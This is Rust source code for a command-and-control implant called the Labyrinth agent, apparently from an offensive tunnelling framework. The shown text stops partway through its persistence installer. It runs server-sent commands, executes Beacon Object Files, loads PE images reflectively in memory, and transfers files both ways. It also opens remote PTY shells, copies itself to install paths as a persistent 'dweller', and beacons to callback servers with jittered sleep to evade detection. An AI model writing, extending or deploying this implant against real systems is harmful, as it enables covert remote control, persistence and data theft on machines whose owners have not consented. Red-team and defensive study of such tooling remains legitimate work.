use crate::agent::connection::ConnectionManager;
// reverse_port_forward: background response channel utilities

use crate::agent::command_executor::{CommandExecutor, OSDetector};
use crate::agent::pty_shell::PtyShellManager;
use crate::agent::system_info::SystemInfoCollector;
use crate::error::{LabyrinthError, Result};
use crate::protocol::{
    AgentInfo, AgentKind, DwellerHibernationConfig, DwellerInstallReceipt, DwellerInstallRequest,
    DwellerRuntimeConfig, DwellerServerEndpoint, DwellerTask, DwellerTaskKind, DwellerTaskResult,
    Message,
};
use crate::security::SecurityManager;

use crate::streaming::models::{CloseReason, ConnectionId, DataDirection, StreamMessage};
use crate::styling;
use crate::transport::{QuicBidiStream, TransportMode};
use base64::{engine::general_purpose, Engine as _};
use bytes::Bytes;
use rand::Rng;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::sync::OnceLock;
use tokio::io::{AsyncBufReadExt, AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
use tokio::net::tcp::OwnedWriteHalf;
use tokio::net::{TcpListener, TcpStream};
use tokio::task::JoinHandle;
use tokio::time::{sleep, Duration};
use tokio_rustls::TlsAcceptor;
use tracing::{error, info, warn};

/// Single Responsibility: Main agent logic and message handling
pub struct AgentCore;

#[derive(Debug, Clone)]
pub struct DwellerRunConfig {
    pub listen_addr: String,
    pub cert_path: String,
    pub key_path: String,
    pub dweller_id: String,
    pub name: Option<String>,
    pub auth_key: String,
    pub config_file: Option<String>,
    pub callback_servers: Vec<DwellerServerEndpoint>,
    pub hibernation: DwellerHibernationConfig,
}

#[derive(Debug, Clone)]
struct DwellerRuntimeContext {
    dweller_id: String,
    listen_addr: String,
    name: Option<String>,
    config_file: Option<String>,
}

static DWELLER_CONTEXT: OnceLock<DwellerRuntimeContext> = OnceLock::new();
static DWELLER_CALLBACKS: OnceLock<
    std::sync::Mutex<std::collections::HashMap<String, DwellerCallbackSupervisor>>,
> = OnceLock::new();

struct DwellerCallbackSupervisor {
    signature: String,
    handle: JoinHandle<()>,
}

impl AgentCore {
    pub async fn run_agent(
        server_addr: &str,
        server_cert_b64: Option<String>,
        accept_fingerprint: Option<String>,
        proxy: Option<String>,
        transport: TransportMode,
        retry: bool,
    ) -> Result<()> {
        info!("{} Starting Labyrinth agent...", styling::SUCCESS_INDICATOR);

        let agent_info =
            SystemInfoCollector::get_system_info_for_server(Some(server_addr), proxy.is_none())
                .await;
        info!(
            "{} Agent info: {} on {}/{}",
            styling::SUCCESS_INDICATOR,
            agent_info.name,
            agent_info.os,
            agent_info.arch
        );

        Self::run_registered_client(
            agent_info,
            server_addr,
            server_cert_b64,
            accept_fingerprint,
            proxy,
            transport,
            retry,
        )
        .await
    }

    async fn run_registered_client(
        agent_info: AgentInfo,
        server_addr: &str,
        server_cert_b64: Option<String>,
        accept_fingerprint: Option<String>,
        proxy: Option<String>,
        transport: TransportMode,
        retry: bool,
    ) -> Result<()> {
        loop {
            // Establish control connection to server
            let control_connection =
                match ConnectionManager::establish_control_connection_with_retry(
                    server_addr,
                    server_cert_b64.clone(),
                    accept_fingerprint.clone(),
                    proxy.clone(),
                    transport,
                    retry,
                )
                .await
                {
                    Ok(stream) => stream,
                    Err(e) => {
                        if retry {
                            sleep(Duration::from_secs(5)).await;
                            continue;
                        } else {
                            return Err(e);
                        }
                    }
                };
            let mut control_stream = control_connection.stream;

            // Send agent registration
            let register_msg = Message::AgentRegister(agent_info.clone());
            let msg_str = serde_json::to_string(&register_msg)?;

            if let Err(e) = control_stream.write_all(msg_str.as_bytes()).await {
                error!(
                    "{} Failed to send registration: {}",
                    styling::ERROR_INDICATOR,
                    e
                );
                if retry {
                    sleep(Duration::from_secs(5)).await;
                    continue;
                } else {
                    return Err(LabyrinthError::Io(e));
                }
            }

            if let Err(e) = control_stream.write_all(b"\n").await {
                error!(
                    "{} Failed to send delimiter: {}",
                    styling::ERROR_INDICATOR,
                    e
                );
                if retry {
                    sleep(Duration::from_secs(5)).await;
                    continue;
                } else {
                    return Err(LabyrinthError::Io(e));
                }
            }

            // Wait for acknowledgment
            let mut buf = Vec::new();
            let mut reader = tokio::io::BufReader::new(&mut control_stream);
            match reader.read_until(b'\n', &mut buf).await {
                Ok(_) => {
                    let response: Message = match serde_json::from_slice(&buf[..buf.len() - 1]) {
                        Ok(msg) => msg,
                        Err(e) => {
                            error!(
                                "{} Failed to parse server response: {}",
                                styling::ERROR_INDICATOR,
                                e
                            );
                            if retry {
                                sleep(Duration::from_secs(5)).await;
                                continue;
                            } else {
                                return Err(LabyrinthError::Json(e));
                            }
                        }
                    };

                    match response {
                        Message::AgentAck => {
                            info!(
                                "{} Successfully registered with server",
                                styling::SUCCESS_INDICATOR
                            );
                        }
                        _ => {
                            error!(
                                "{} Unexpected response from server: {:?}",
                                styling::ERROR_INDICATOR,
                                response
                            );
                            if retry {
                                sleep(Duration::from_secs(5)).await;
                                continue;
                            } else {
                                return Err(LabyrinthError::Message(
                                    "Unexpected server response".to_string(),
                                ));
                            }
                        }
                    }
                }
                Err(e) => {
                    error!(
                        "{} Failed to read server response: {}",
                        styling::ERROR_INDICATOR,
                        e
                    );
                    if retry {
                        sleep(Duration::from_secs(5)).await;
                        continue;
                    } else {
                        return Err(LabyrinthError::Io(e));
                    }
                }
            }

            let (control_reader, mut control_writer) = tokio::io::split(control_stream);
            let reader = tokio::io::BufReader::new(control_reader);

            info!(
                "{} Agent connected and ready for commands",
                styling::SUCCESS_INDICATOR
            );

            if let Some(connection) = control_connection.quic_connection {
                tokio::spawn(Self::run_quic_stream_acceptor(connection));
            }

            Self::run_control_loop(reader, &mut control_writer).await;

            if !retry {
                break;
            }

            warn!(
                "{} Connection lost, retrying in 5 seconds...",
                styling::WARNING_INDICATOR
            );
            sleep(Duration::from_secs(5)).await;
        }

        Ok(())
    }

    pub async fn run_dweller(config: DwellerRunConfig) -> Result<()> {
        let context = DwellerRuntimeContext {
            dweller_id: config.dweller_id.clone(),
            listen_addr: config.listen_addr.clone(),
            name: config.name.clone(),
            config_file: config.config_file.clone(),
        };
        let _ = DWELLER_CONTEXT.set(context);

        let cert_pem = tokio::fs::read_to_string(&config.cert_path)
            .await
            .map_err(LabyrinthError::Io)?;
        let key_pem = tokio::fs::read_to_string(&config.key_path)
            .await
            .map_err(LabyrinthError::Io)?;

        let mut cert_reader = cert_pem.as_bytes();
        let certs = rustls_pemfile::certs(&mut cert_reader)
            .collect::<std::result::Result<Vec<_>, std::io::Error>>()
            .map_err(LabyrinthError::Io)?;
        let mut key_reader = key_pem.as_bytes();
        let mut keys = rustls_pemfile::pkcs8_private_keys(&mut key_reader)
            .collect::<std::result::Result<Vec<_>, std::io::Error>>()
            .map_err(LabyrinthError::Io)?;
        let key = keys
            .pop()
            .ok_or_else(|| LabyrinthError::Message("No private key found".to_string()))?;

        let tls_config = rustls::ServerConfig::builder()
            .with_no_client_auth()
            .with_single_cert(certs, key.into())?;
        let acceptor = TlsAcceptor::from(Arc::new(tls_config));
        let listener = TcpListener::bind(&config.listen_addr)
            .await
            .map_err(LabyrinthError::Io)?;

        info!(
            "{} Dweller {} listening on {}",
            styling::SUCCESS_INDICATOR,
            config.dweller_id,
            config.listen_addr
        );

        let runtime_config = Self::load_dweller_runtime_config(
            config.config_file.as_deref(),
            config.callback_servers,
            config.hibernation,
        )
        .await;
        Self::spawn_dweller_callbacks(runtime_config);

        loop {
            let (stream, _addr) = listener.accept().await.map_err(LabyrinthError::Io)?;
            let acceptor = acceptor.clone();
            let auth_key = config.auth_key.clone();
            let dweller_id = config.dweller_id.clone();
            let listen_addr = config.listen_addr.clone();
            let name = config.name.clone();
            tokio::spawn(async move {
                if let Err(e) = Self::handle_dweller_client(
                    acceptor,
                    stream,
                    auth_key,
                    dweller_id,
                    listen_addr,
                    name,
                )
                .await
                {
                    error!("{} Dweller session failed: {}", styling::ERROR_INDICATOR, e);
                }
            });
        }
    }

    async fn load_dweller_runtime_config(
        config_file: Option<&str>,
        mut cli_callbacks: Vec<DwellerServerEndpoint>,
        cli_hibernation: DwellerHibernationConfig,
    ) -> DwellerRuntimeConfig {
        let mut hibernation = cli_hibernation;
        if let Some(path) = config_file {
            match tokio::fs::read_to_string(path).await {
                Ok(body) => match serde_json::from_str::<DwellerRuntimeConfig>(&body) {
                    Ok(config) => {
                        cli_callbacks.extend(config.callback_servers);
                        hibernation = config.hibernation;
                    }
                    Err(e) => warn!(
                        "{} Failed to parse dweller config {}: {}",
                        styling::WARNING_INDICATOR,
                        path,
                        e
                    ),
                },
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
                Err(e) => warn!(
                    "{} Failed to read dweller config {}: {}",
                    styling::WARNING_INDICATOR,
                    path,
                    e
                ),
            }
        }
        DwellerRuntimeConfig {
            callback_servers: Self::dedupe_callbacks(cli_callbacks),
            hibernation: Self::normalize_hibernation(hibernation),
        }
    }

    fn dedupe_callbacks(callbacks: Vec<DwellerServerEndpoint>) -> Vec<DwellerServerEndpoint> {
        let mut seen = std::collections::HashSet::new();
        let mut deduped = Vec::new();
        for callback in callbacks {
            if callback.address.trim().is_empty() {
                continue;
            }
            let key = format!("{}|{}", callback.address, callback.transport);
            if seen.insert(key) {
                deduped.push(callback);
            }
        }
        deduped
    }

    fn normalize_hibernation(mut config: DwellerHibernationConfig) -> DwellerHibernationConfig {
        if config.sleep_seconds == 0 {
            config.sleep_seconds = 60;
        }
        if config.jitter_percent > 100 {
            config.jitter_percent = 100;
        }
        if config.task_batch_size == 0 {
            config.task_batch_size = 10;
        }
        config
    }

    fn spawn_dweller_callbacks(config: DwellerRuntimeConfig) {
        if config.callback_servers.is_empty() {
            return;
        }

        let callbacks = Self::dedupe_callbacks(config.callback_servers);
        let desired: std::collections::HashSet<String> =
            callbacks.iter().map(Self::callback_key).collect();
        let supervisors =
            DWELLER_CALLBACKS.get_or_init(|| std::sync::Mutex::new(Default::default()));
        let mut supervisors = supervisors
            .lock()
            .expect("dweller callback tracker poisoned");
        let stale: Vec<String> = supervisors
            .keys()
            .filter(|key| !desired.contains(*key))
            .cloned()
            .collect();
        for key in stale {
            if let Some(supervisor) = supervisors.remove(&key) {
                supervisor.handle.abort();
            }
        }

        for callback in callbacks {
            let key = Self::callback_key(&callback);
            let signature = Self::callback_signature(&callback, &config.hibernation);
            if let Some(existing) = supervisors.get(&key) {
                if existing.signature == signature {
                    continue;
                }
            }
            if let Some(existing) = supervisors.remove(&key) {
                existing.handle.abort();
            }
            let hibernation = config.hibernation.clone();
            let handle = tokio::spawn(async move {
                if let Err(e) = Self::run_dweller_callback(callback, hibernation).await {
                    warn!(
                        "{} Dweller callback supervisor stopped: {}",
                        styling::WARNING_INDICATOR,
                        e
                    );
                }
            });
            supervisors.insert(key, DwellerCallbackSupervisor { signature, handle });
        }
    }

    fn callback_key(callback: &DwellerServerEndpoint) -> String {
        format!("{}|{}", callback.address, callback.transport)
    }

    fn callback_signature(
        callback: &DwellerServerEndpoint,
        hibernation: &DwellerHibernationConfig,
    ) -> String {
        format!(
            "{}|{}|{}|{}|{}|{}|{}",
            callback.address,
            callback.transport,
            callback.fingerprint.clone().unwrap_or_default(),
            hibernation.enabled,
            hibernation.sleep_seconds,
            hibernation.jitter_percent,
            hibernation.task_batch_size
        )
    }

    async fn run_dweller_callback(
        endpoint: DwellerServerEndpoint,
        hibernation: DwellerHibernationConfig,
    ) -> Result<()> {
        let context = DWELLER_CONTEXT.get().cloned().ok_or_else(|| {
            LabyrinthError::Message("Dweller runtime context missing".to_string())
        })?;
        let transport = match endpoint.transport.to_ascii_lowercase().as_str() {
            "quic" | "quic/udp" => TransportMode::Quic,
            "tcp" | "tcp/tls" => TransportMode::Tcp,
            "http" | "https" | "dns" => {
                return Err(LabyrinthError::Message(format!(
                    "Dweller callback transport '{}' is configured but no {} tasking listener is enabled in this build",
                    endpoint.transport, endpoint.transport
                )));
            }
            _ => TransportMode::Tcp,
        };
        let port = context
            .listen_addr
            .rsplit(':')
            .next()
            .and_then(|value| value.parse::<u16>().ok());
        let connectivity =
            SystemInfoCollector::collect_connectivity(Some(&endpoint.address), true).await;
        let info = SystemInfoCollector::build_agent_info(
            AgentKind::Dweller,
            Some(context.dweller_id.clone()),
            Some(context.listen_addr.clone()),
            port,
            context.name.clone(),
            connectivity,
        );

        info!(
            "{} Dweller callback enabled for {}",
            styling::SUCCESS_INDICATOR,
            endpoint.address
        );
        if hibernation.enabled {
            return Self::run_hibernating_dweller_callback(
                info,
                endpoint,
                transport,
                Self::normalize_hibernation(hibernation),
            )
            .await;
        }
        Self::run_registered_client(
            info,
            &endpoint.address,
            None,
            endpoint.fingerprint,
            None,
            transport,
            true,
        )
        .await
    }

    async fn run_hibernating_dweller_callback(
        agent_info: AgentInfo,
        endpoint: DwellerServerEndpoint,
        transport: TransportMode,
        hibernation: DwellerHibernationConfig,
    ) -> Result<()> {
        loop {
            match Self::run_dweller_poll_cycle(&agent_info, &endpoint, transport, &hibernation)
                .await
            {
                Ok(count) => {
                    if count > 0 {
                        info!(
                            "{} Dweller completed {} queued task(s)",
                            styling::SUCCESS_INDICATOR,
                            count
                        );
                    }
                }
                Err(e) => warn!(
                    "{} Dweller hibernation check-in failed: {}",
                    styling::WARNING_INDICATOR,
                    e
                ),
            }
            let sleep_for = Self::jittered_sleep_duration(&hibernation);
            info!(
                "{} Dweller hibernating for {} seconds",
                styling::SUCCESS_INDICATOR,
                sleep_for.as_secs()
            );
            sleep(sleep_for).await;
        }
    }

    async fn run_dweller_poll_cycle(
        agent_info: &AgentInfo,
        endpoint: &DwellerServerEndpoint,
        transport: TransportMode,
        hibernation: &DwellerHibernationConfig,
    ) -> Result<usize> {
        let control_connection = ConnectionManager::establish_control_connection_with_retry(
            &endpoint.address,
            None,
            endpoint.fingerprint.clone(),
            None,
            transport,
            false,
        )
        .await?;
        let mut control_stream = control_connection.stream;
        Self::write_message(
            &mut control_stream,
            &Message::AgentRegister(agent_info.clone()),
        )
        .await?;

        let mut reader = tokio::io::BufReader::new(control_stream);
        let mut buf = Vec::new();
        reader.read_until(b'\n', &mut buf).await?;
        let response: Message = serde_json::from_slice(&buf[..buf.len() - 1])?;
        if !matches!(response, Message::AgentAck) {
            return Err(LabyrinthError::Message(format!(
                "Unexpected server response during dweller poll: {:?}",
                response
            )));
        }

        let mut stream = reader.into_inner();
        Self::write_message(
            &mut stream,
            &Message::DwellerPollTasks {
                dweller_id: agent_info.stable_id.clone().unwrap_or_default(),
                max_tasks: hibernation.task_batch_size,
            },
        )
        .await?;

        let mut reader = tokio::io::BufReader::new(stream);
        buf.clear();
        reader.read_until(b'\n', &mut buf).await?;
        let tasks_message: Message = serde_json::from_slice(&buf[..buf.len() - 1])?;
        let tasks = match tasks_message {
            Message::DwellerTasks { tasks } => tasks,
            other => {
                return Err(LabyrinthError::Message(format!(
                    "Unexpected task poll response: {:?}",
                    other
                )))
            }
        };

        let mut stream = reader.into_inner();
        let mut completed = 0;
        for task in tasks {
            let result = Self::execute_dweller_task(task).await;
            Self::write_message(
                &mut stream,
                &Message::DwellerTaskResult {
                    dweller_id: agent_info.stable_id.clone().unwrap_or_default(),
                    result,
                },
            )
            .await?;
            completed += 1;
        }
        Ok(completed)
    }

    async fn execute_dweller_task(task: DwellerTask) -> DwellerTaskResult {
        let finished_at = Self::system_time_string();
        match task.kind {
            DwellerTaskKind::Command { command } => {
                let os = OSDetector::detect_os();
                let executor = CommandExecutor::new(&os);
                match executor.execute_command(&command).await {
                    Ok(output) => DwellerTaskResult {
                        task_id: task.task_id,
                        success: true,
                        output,
                        error: None,
                        finished_at,
                    },
                    Err(e) => DwellerTaskResult {
                        task_id: task.task_id,
                        success: false,
                        output: String::new(),
                        error: Some(e.to_string()),
                        finished_at,
                    },
                }
            }
            DwellerTaskKind::StartTunnel { .. }
            | DwellerTaskKind::StopTunnel
            | DwellerTaskKind::PortalPortForward { .. } => DwellerTaskResult {
                task_id: task.task_id,
                success: false,
                output: String::new(),
                error: Some(
                    "Long-lived tunnel and port-forward tasks require hibernation=false so the control channel stays online"
                        .to_string(),
                ),
                finished_at,
            },
        }
    }

    fn jittered_sleep_duration(config: &DwellerHibernationConfig) -> Duration {
        let base = config.sleep_seconds.max(1);
        let spread = base.saturating_mul(config.jitter_percent.min(100) as u64) / 100;
        let min = base.saturating_sub(spread).max(1);
        let max = base.saturating_add(spread).max(min);
        let seconds = if min == max {
            min
        } else {
            rand::thread_rng().gen_range(min..=max)
        };
        Duration::from_secs(seconds)
    }

    fn system_time_string() -> String {
        format!("{:?}", std::time::SystemTime::now())
    }

    async fn persist_dweller_runtime_config(
        config_file: Option<&str>,
        config: DwellerRuntimeConfig,
    ) -> Result<()> {
        let Some(path) = config_file else {
            return Ok(());
        };
        let config = DwellerRuntimeConfig {
            callback_servers: Self::dedupe_callbacks(config.callback_servers),
            hibernation: Self::normalize_hibernation(config.hibernation),
        };
        if let Some(parent) = Path::new(path).parent() {
            tokio::fs::create_dir_all(parent)
                .await
                .map_err(LabyrinthError::Io)?;
        }
        let body = serde_json::to_string_pretty(&config)?;
        tokio::fs::write(path, body)
            .await
            .map_err(LabyrinthError::Io)
    }

    async fn handle_dweller_client(
        acceptor: TlsAcceptor,
        stream: TcpStream,
        expected_auth_key: String,
        dweller_id: String,
        listen_addr: String,
        name: Option<String>,
    ) -> Result<()> {
        let tls_stream = acceptor.accept(stream).await.map_err(LabyrinthError::Io)?;
        let (tls_reader, mut tls_writer) = tokio::io::split(tls_stream);
        let mut reader = tokio::io::BufReader::new(tls_reader);
        let mut buf = Vec::new();
        reader.read_until(b'\n', &mut buf).await?;

        let hello: Message = serde_json::from_slice(&buf[..buf.len() - 1])?;
        match hello {
            Message::DwellerHello { auth_key } if auth_key == expected_auth_key => {}
            _ => {
                return Err(LabyrinthError::Message(
                    "Dweller authentication failed".to_string(),
                ));
            }
        }

        let port = listen_addr
            .rsplit(':')
            .next()
            .and_then(|value| value.parse::<u16>().ok());
        let connectivity = SystemInfoCollector::collect_connectivity(None, true).await;
        let info = SystemInfoCollector::build_agent_info(
            AgentKind::Dweller,
            Some(dweller_id.clone()),
            Some(listen_addr.clone()),
            port,
            name,
            connectivity,
        );
        Self::write_message(&mut tls_writer, &Message::AgentRegister(info)).await?;

        buf.clear();
        reader.read_until(b'\n', &mut buf).await?;
        let response: Message = serde_json::from_slice(&buf[..buf.len() - 1])?;
        match response {
            Message::AgentAck => {
                Self::run_control_loop(reader, &mut tls_writer).await;
                Ok(())
            }
            _ => Err(LabyrinthError::Message(
                "Dweller expected AgentAck from server".to_string(),
            )),
        }
    }

    async fn run_control_loop<R, W>(mut reader: tokio::io::BufReader<R>, writer: &mut W)
    where
        R: AsyncRead + Unpin,
        W: AsyncWrite + Unpin,
    {
        use crate::agent::reverse_port_forward::get_response_channel;

        let (_, response_receiver) = get_response_channel();

        loop {
            let mut buf = Vec::new();
            let mut response_receiver_guard = response_receiver.lock().await;

            tokio::select! {
                read_result = reader.read_until(b'\n', &mut buf) => {
                    match read_result {
                        Ok(0) => {
                            warn!("{} Server closed connection", styling::WARNING_INDICATOR);
                            break;
                        }
                        Ok(_) => {
                            let message: Message = match serde_json::from_slice(&buf[..buf.len()-1]) {
                                Ok(msg) => msg,
                                Err(e) => {
                                    error!("{} Failed to parse message: {}", styling::ERROR_INDICATOR, e);
                                    continue;
                                }
                            };

                            drop(response_receiver_guard);
                            if let Err(e) = Self::handle_message(message, writer).await {
                                error!("{} Failed to handle message: {}", styling::ERROR_INDICATOR, e);
                                break;
                            }
                        }
                        Err(e) => {
                            error!("{} Failed to read from server: {}", styling::ERROR_INDICATOR, e);
                            break;
                        }
                    }
                }
                response = response_receiver_guard.recv() => {
                    if let Some(response_msg) = response {
                        if let Err(e) = Self::write_message(writer, &response_msg).await {
                            error!("{} Failed to send background response to server: {}", styling::ERROR_INDICATOR, e);
                            break;
                        }
                    }
                }
            }
        }
    }

    async fn write_message<W: AsyncWrite + Unpin>(writer: &mut W, message: &Message) -> Result<()> {
        let payload = serde_json::to_string(message)?;
        writer.write_all(payload.as_bytes()).await?;
        writer.write_all(b"\n").await?;
        Ok(())
    }

    async fn handle_message<W: AsyncWrite + Unpin>(
        message: Message,
        tls_writer: &mut W,
    ) -> Result<()> {
        match message {
            Message::StartTunnel { subnet, tun_name } => {
                info!(
                    "{} Server requested tunnel start for subnet: {}",
                    styling::SUCCESS_INDICATOR,
                    subnet
                );
                // Agent remains unprivileged; server owns TUN and stack. Just ACK.
                let ack_msg = Message::TunnelStarted;
                let ack_str = serde_json::to_string(&ack_msg)?;
                tls_writer.write_all(ack_str.as_bytes()).await?;
                tls_writer.write_all(b"\n").await?;
                info!(
                    "{} Tunnel acknowledged for subnet {} (server-side TUN: {})",
                    styling::SUCCESS_INDICATOR,
                    subnet,
                    tun_name
                );
            }
            Message::StopTunnel => {
                info!(
                    "{} Server requested tunnel stop",
                    styling::SUCCESS_INDICATOR
                );

                // Acknowledge tunnel stop
                let ack_msg = Message::TunnelStopped;
                let ack_str = serde_json::to_string(&ack_msg)?;

                tls_writer.write_all(ack_str.as_bytes()).await?;
                tls_writer.write_all(b"\n").await?;

                info!("{} Tunnel stopped", styling::SUCCESS_INDICATOR);
            }
            // DataPacket is server-only in ligolo-like design; agent ignores
            Message::Ping => {
                // Respond to ping
                let pong_msg = Message::Pong;
                let pong_str = serde_json::to_string(&pong_msg)?;

                tls_writer.write_all(pong_str.as_bytes()).await?;
                tls_writer.write_all(b"\n").await?;
            }
            Message::ConfigureDweller { config } => {
                let response = if let Some(context) = DWELLER_CONTEXT.get() {
                    let runtime_config = DwellerRuntimeConfig {
                        callback_servers: Self::dedupe_callbacks(config.callback_servers),
                        hibernation: Self::normalize_hibernation(config.hibernation),
                    };
                    match Self::persist_dweller_runtime_config(
                        context.config_file.as_deref(),
                        runtime_config.clone(),
                    )
                    .await
                    {
                        Ok(()) => {
                            Self::spawn_dweller_callbacks(runtime_config);
                            Message::ConfigureDwellerResponse {
                                success: true,
                                message: "Dweller runtime configuration updated".to_string(),
                            }
                        }
                        Err(e) => Message::ConfigureDwellerResponse {
                            success: false,
                            message: e.to_string(),
                        },
                    }
                } else {
                    Message::ConfigureDwellerResponse {
                        success: false,
                        message: "Connected endpoint is not running as a dweller".to_string(),
                    }
                };
                let response_str = serde_json::to_string(&response)?;
                tls_writer.write_all(response_str.as_bytes()).await?;
                tls_writer.write_all(b"\n").await?;
            }
            Message::PortalPortForward {
                local_port,
                target_addr,
                auth_key: _,
            } => {
                info!(
                    "{} Server requested portal forwarding: {} -> {}",
                    styling::SUCCESS_INDICATOR,
                    local_port,
                    target_addr
                );

                // Start port forwarding in the background
                let target_addr_clone = target_addr.clone();
                tokio::spawn(async move {
                    if let Err(e) = Self::start_port_forward(local_port, &target_addr_clone).await {
                        error!("{} Port forwarding failed: {}", styling::ERROR_INDICATOR, e);
                    } else {
                        info!(
                            "{} Port forwarding active: {} -> {}",
                            styling::SUCCESS_INDICATOR,
                            local_port,
                            target_addr_clone
                        );
                    }
                });
            }

            Message::CommandRequest { command } => {
                info!(
                    "{} Server requested command execution: {}",
                    styling::SUCCESS_INDICATOR,
                    command
                );

                // Detect OS and create appropriate command executor
                let os = OSDetector::detect_os();
                let executor = CommandExecutor::new(&os);

                // Execute command and send response
                let response = match executor.execute_command(&command).await {
                    Ok(output) => Message::CommandResponse {
                        output,
                        error: None,
                    },
                    Err(e) => Message::CommandResponse {
                        output: String::new(),
                        error: Some(e.to_string()),
                    },
                };

                let response_str = serde_json::to_string(&response)?;
                tls_writer.write_all(response_str.as_bytes()).await?;
                tls_writer.write_all(b"\n").await?;

                info!(
                    "{} Command execution completed: {}",
                    styling::SUCCESS_INDICATOR,
                    command
                );
            }
            Message::BofExecutionRequest {
                bof_data,
                args,
                entry_point,
            } => {
                info!(
                    "{} Server requested BOF execution: {}",
                    styling::SUCCESS_INDICATOR,
                    entry_point
                );

                let os = OSDetector::detect_os();
                let executor = CommandExecutor::new(&os);

                let response = match executor.execute_bof(bof_data, args, &entry_point).await {
                    Ok(output) => Message::BofExecutionResponse {
                        output,
                        error: None,
                    },
                    Err(e) => Message::BofExecutionResponse {
                        output: String::new(),
                        error: Some(e.to_string()),
                    },
                };

                let response_str = serde_json::to_string(&response)?;
                tls_writer.write_all(response_str.as_bytes()).await?;
                tls_writer.write_all(b"\n").await?;
            }
            Message::ReflectiveLoadRequest { pe_data, args } => {
                info!(
                    "{} Server requested reflective loading",
                    styling::SUCCESS_INDICATOR
                );

                let os = OSDetector::detect_os();
                let executor = CommandExecutor::new(&os);

                let response = match executor.execute_reflective(pe_data, &args).await {
                    Ok(output) => Message::ReflectiveLoadResponse {
                        output,
                        error: None,
                    },
                    Err(e) => Message::ReflectiveLoadResponse {
                        output: String::new(),
                        error: Some(e.to_string()),
                    },
                };

                let response_str = serde_json::to_string(&response)?;
                tls_writer.write_all(response_str.as_bytes()).await?;
                tls_writer.write_all(b"\n").await?;
            }
            Message::FileUpload {
                remote_path,
                content_b64,
            } => {
                let response = match general_purpose::STANDARD.decode(content_b64.as_bytes()) {
                    Ok(content) => {
                        let path = std::path::Path::new(&remote_path);
                        let parent_result = if let Some(parent) = path.parent() {
                            tokio::fs::create_dir_all(parent).await
                        } else {
                            Ok(())
                        };

                        match parent_result {
                            Ok(()) => match tokio::fs::write(path, &content).await {
                                Ok(()) => Message::FileUploadResponse {
                                    success: true,
                                    message: format!(
                                        "Uploaded {} bytes to {}",
                                        content.len(),
                                        remote_path
                                    ),
                                },
                                Err(e) => Message::FileUploadResponse {
                                    success: false,
                                    message: format!("Failed to write {}: {}", remote_path, e),
                                },
                            },
                            Err(e) => Message::FileUploadResponse {
                                success: false,
                                message: format!("Failed to create parent directories: {}", e),
                            },
                        }
                    }
                    Err(e) => Message::FileUploadResponse {
                        success: false,
                        message: format!("Invalid base64 content: {}", e),
                    },
                };

                let response_str = serde_json::to_string(&response)?;
                tls_writer.write_all(response_str.as_bytes()).await?;
                tls_writer.write_all(b"\n").await?;
            }
            Message::FileDownloadRequest { remote_path } => {
                let response = match tokio::fs::read(&remote_path).await {
                    Ok(content) => Message::FileDownloadResponse {
                        success: true,
                        message: format!("Read {} bytes from {}", content.len(), remote_path),
                        remote_path,
                        content_b64: Some(general_purpose::STANDARD.encode(content)),
                    },
                    Err(e) => Message::FileDownloadResponse {
                        success: false,
                        message: format!("Failed to read file: {}", e),
                        remote_path,
                        content_b64: None,
                    },
                };

                let response_str = serde_json::to_string(&response)?;
                tls_writer.write_all(response_str.as_bytes()).await?;
                tls_writer.write_all(b"\n").await?;
            }
            Message::DropDweller { request } => {
                let response = match Self::install_dweller(request).await {
                    Ok(receipt) => Message::DropDwellerResponse {
                        success: true,
                        message: format!(
                            "Dweller {} installed and activated on {}:{}",
                            receipt.dweller_name, receipt.listen_addr, receipt.listen_port
                        ),
                        receipt: Some(receipt),
                    },
                    Err(e) => Message::DropDwellerResponse {
                        success: false,
                        message: e.to_string(),
                        receipt: None,
                    },
                };

                let response_str = serde_json::to_string(&response)?;
                tls_writer.write_all(response_str.as_bytes()).await?;
                tls_writer.write_all(b"\n").await?;
            }
            Message::ShellSessionStart {
                session_id,
                cols,
                rows,
            } => {
                if let Err(e) = PtyShellManager::start_session(session_id.clone(), cols, rows).await
                {
                    let response = Message::ShellSessionStarted {
                        session_id,
                        success: false,
                        message: e.to_string(),
                    };
                    let response_str = serde_json::to_string(&response)?;
                    tls_writer.write_all(response_str.as_bytes()).await?;
                    tls_writer.write_all(b"\n").await?;
                }
            }
            Message::ShellSessionInput {
                session_id,
                data_b64,
            } => {
                if let Err(e) = PtyShellManager::send_input(&session_id, &data_b64).await {
                    let response = Message::ShellSessionOutput {
                        session_id,
                        data_b64: general_purpose::STANDARD
                            .encode(format!("\n[labyrinth shell error] {}\n", e)),
                    };
                    let response_str = serde_json::to_string(&response)?;
                    tls_writer.write_all(response_str.as_bytes()).await?;
                    tls_writer.write_all(b"\n").await?;
                }
            }
            Message::ShellSessionResize {
                session_id,
                cols,
                rows,
            } => {
                if let Err(e) = PtyShellManager::resize_session(&session_id, cols, rows).await {
                    warn!(
                        "{} Failed to resize shell session {}: {}",
                        styling::WARNING_INDICATOR,
                        session_id,
                        e
                    );
                }
            }
            Message::ShellSessionClose { session_id } => {
                if let Err(e) = PtyShellManager::close_session(&session_id).await {
                    warn!(
                        "{} Failed to close shell session {}: {}",
                        styling::WARNING_INDICATOR,
                        session_id,
                        e
                    );
                }
            }
            // New reverse port forwarding message handlers
            Message::ReversePortForwardSetup {
                connection_id,
                local_port,
                target_host,
                target_port,
            } => {
                // Reverse port forwarding via agent-side manager is not active in this build.
                // The server currently handles legacy mode locally.
                warn!(
                    "{} Ignoring reverse port forward setup: id={} {} -> {}:{}",
                    styling::WARNING_INDICATOR,
                    connection_id,
                    local_port,
                    target_host,
                    target_port
                );
            }
            Message::Stream(stream_message) => {
                if let Err(e) = Self::handle_stream_message(stream_message).await {
                    error!(
                        "{} Failed to handle stream message: {}",
                        styling::ERROR_INDICATOR,
                        e
                    );
                }
            }
            _ => {
                warn!(
                    "{} Received unexpected message: {:?}",
                    styling::WARNING_INDICATOR,
                    message
                );
            }
        }
        Ok(())
    }

    async fn install_dweller(request: DwellerInstallRequest) -> Result<DwellerInstallReceipt> {
        Self::ensure_dweller_permissions()?;

        let current_exe = std::env::current_exe().map_err(LabyrinthError::Io)?;
        let install_path = PathBuf::from(&request.install_path);
        let config_dir = PathBuf::from(&request.config_dir);
        tokio::fs::create_dir_all(&config_dir)
            .await
            .map_err(LabyrinthError::Io)?;

        if let Some(parent) = install_path.parent() {
            tokio::fs::create_dir_all(parent)
                .await
                .map_err(LabyrinthError::Io)?;
        }

        tokio::fs::copy(&current_exe, &install_path)
            .await
